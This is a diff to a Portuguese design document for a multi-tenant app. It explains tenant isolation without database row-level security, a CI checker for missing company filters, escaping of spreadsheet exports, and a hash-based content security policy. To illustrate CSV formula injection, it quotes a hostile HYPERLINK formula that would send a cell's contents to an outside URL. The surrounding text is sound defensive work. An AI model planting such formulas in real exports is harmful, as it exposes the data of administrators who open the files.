@@ -230,6 +230,97 @@ Só entrada e perda têm data informada. Ajuste de estoque, estorno de perda e c
 mesmo nos três: o fato **é** o lançamento. Ajustar estoque é o resultado de uma contagem feita agora; estornar uma perda
 antiga é uma decisão de hoje, não um evento do passado.
 
+## Isolamento entre empresas não tem rede de proteção no banco
+
+Não há **RLS** (segurança em nível de linha) no PostgreSQL: nenhuma `POLICY`, nenhum
+`ENABLE ROW LEVEL SECURITY`. O isolamento é inteiramente da aplicação, pelo `eq(tabela.companyId, …)`
+descrito no começo deste documento. Consequência a encarar de frente: **uma consulta futura que
+esqueça o filtro vaza dados entre clientes e nada no banco impede**. O que segura hoje é o padrão
+repetido em todo service, a revisão de código e os testes de isolamento (`access-control.test.ts`).
+
+### O verificador que substitui a rede de proteção por enquanto
+
+`npm run check:tenant-scope` (`scripts/check-tenant-scope.mjs`) lê o código da API com o AST do
+TypeScript e acusa consulta a tabela multiempresa que rode numa função que **nunca menciona
+`companyId`**. Roda no CI e falha o build. A lista de tabelas sai do próprio schema — tabela nova com
+`companyId` entra na varredura sozinha, sem ninguém precisar lembrar.
+
+A regra é essa, e não algo mais forte, por medida deliberada:
+
+- **Olhar só o argumento do `.where()` não serve.** Quase toda listagem monta a condição antes
+  (`const where = and(...conditions)`) ou delega a um helper (`buildLossesConditions`), então o
+  verificador acusaria praticamente todas as consultas corretas — e ferramenta que grita demais é
+  desligada na primeira semana.
+- **Exigir o texto `<tabela>.companyId` também não serve**, pela mesma razão: quebra em quem delega a
+  montagem da condição a outro arquivo.
+- A regra escolhida se apoia na convenção deste projeto: `companyId` é o primeiro argumento de toda
+  função de serviço. Se a função nem recebeu nem usou `companyId`, ela não pensou em empresa.
+
+**O que ele não pega:** função que recebe `companyId` e escreve o filtro errado (com a variável
+trocada, por exemplo). Ele cobre o esquecimento honesto, que é o caso real; não é prova de
+isolamento. Quem prova isolamento de ponta a ponta é `access-control.test.ts`.
+
+Na primeira execução ele encontrou uma coisa real: `countAttachments` (`invoice-storage.ts`) contava
+anexos por entrada sem filtrar empresa, apoiado em a rota ter validado a entrada antes. Passou a
+filtrar — a tabela guarda `companyId` justamente para não depender do chamador.
+
+As três supressões declaradas no script são as travessias que ele acusaria: `/logs/technical`
+(cobranças e logs da plataforma), o login (procura por e-mail antes de existir sessão) e a limpeza de
+anexos órfãos (manutenção transversal por definição). Outras travessias legítimas — `isPlatformCompany`
+localizando a empresa Plataforma pelo `super_admin`, a gestão de usuários da plataforma, a validação de
+sessão — passam sozinhas porque mencionam `companyId` por outro motivo, e por isso não aparecem lá.
+
+### Por que RLS não é ligar uma chave
+
+Antes de considerar ligar RLS, entenda por que ela não funcionaria hoje: `POSTGRES_USER` é criado pela
+imagem oficial do PostgreSQL como **superusuário**, e superusuário **ignora RLS inteiramente** —
+`FORCE ROW LEVEL SECURITY` também não alcança superusuário. Ligar políticas com a conexão atual
+produziria um relatório de conformidade bonito e zero consultas barradas. O pré-requisito é criar um
+papel de aplicação sem `SUPERUSER` e sem `BYPASSRLS`, apontar a `DATABASE_URL` para ele e conferir
+que migrations, seeds e backup continuam funcionando com privilégio reduzido — nessa ordem.
+
+## Planilha exportada não pode virar fórmula
+
+Excel e LibreOffice avaliam como fórmula toda célula iniciada por `=`, `+`, `-`, `@`, tabulação ou
+retorno de carro. As planilhas do sistema carregam texto digitado pelo usuário — nome de produto,
+observação, motivo — então um produto chamado `=HYPERLINK("http://…"&A1;"clique")` viraria fórmula
+viva. O detalhe que torna isso relevante e não teórico: **quem digita pode ser um operador e quem
+exporta é normalmente o administrador**, então o efeito acontece na máquina de quem tem mais acesso.
+
+`protectFromFormula` (`lib/csv.ts`) prefixa a célula com apóstrofo, que a planilha entende como "isto
+é texto" e não exibe. Duas sutilezas:
+
+- **Número negativo é exceção.** `-2,000` dispara o mesmo `-` sem ser ameaça, e prefixá-lo
+  transformaria quantidade em texto: a planilha pararia de somar a coluna. `NUMERIC_CELL` reconhece o
+  formato brasileiro (inclusive milhar) e passa direto.
+- **A proteção é simétrica.** A exportação de Produtos reimporta pela tela de importação
+  (`normalizeHeader` ignora acentos e caixa, e `situacao` é alias de `ativo`), então `parseCsv` remove
+  o apóstrofo na leitura — só quando o caractere seguinte é um dos gatilhos, para não estragar um nome
+  que legitimamente comece com apóstrofo. Sem isso, exportar e reimportar renomearia o produto.
+
+## CSP sem `unsafe-inline`: o hash do script do tema
+
+A CSP de produção (`deploy/Caddyfile`, repetida em `deploy/nginx.conf`) autoriza scripts por **hash**,
+não por `'unsafe-inline'`. A diferença importa porque `'unsafe-inline'` anula a CSP como rede de
+proteção: com ela, qualquer script injetado executaria.
+
+Existe **um** script inline em `apps/web/index.html`, o que aplica o tema antes da primeira pintura.
+Ele é inline por necessidade: num arquivo externo chegaria depois do primeiro quadro e o modo escuro
+piscaria branco. Por isso a CSP traz o `sha256-…` dele em vez da permissão geral.
+
+Isso cria um acoplamento entre um HTML e dois arquivos de configuração, e a falha é **silenciosa** —
+hash divergente bloqueia o script, o tema passa a ser aplicado só depois que o Vue monta, e volta o
+piscado. `npm run csp:hash` confere os dois arquivos (com `-- --write` corrige), roda no CI e falha o
+build quando divergem.
+
+Os cabeçalhos estão duplicados no nginx de propósito: em produção o Caddy na frente os injeta, mas
+quem alcançar a porta 8080 direto receberia a aplicação sem proteção nenhuma. `add_header` dentro de
+um `location` **descarta** os herdados do `server`, por isso eles reaparecem no `location /`.
+
+`style-src` mantém `'unsafe-inline'`: o `index.html` tem um bloco `<style>` grande para a tela de
+carregamento e o Vue aplica estilo dinâmico em componente. Aqui o ganho seria pequeno e a quebra,
+visível.
+
 ## Mensagens de erro sempre em português
 
 Toda mensagem que chega ao cliente é em português. Isso é fácil de garantir nos erros que o próprio sistema levanta (`AppError` e Zod), e é justamente onde a regra vazava: **erros do Fastify e dos seus plugins nascem em inglês**, e o `errorHandler` repassava `error.message` sem olhar em qualquer 4xx que não fosse `AppError`. Foi assim que `Rate limit exceeded, retry in 53 seconds` apareceu na tela do usuário.
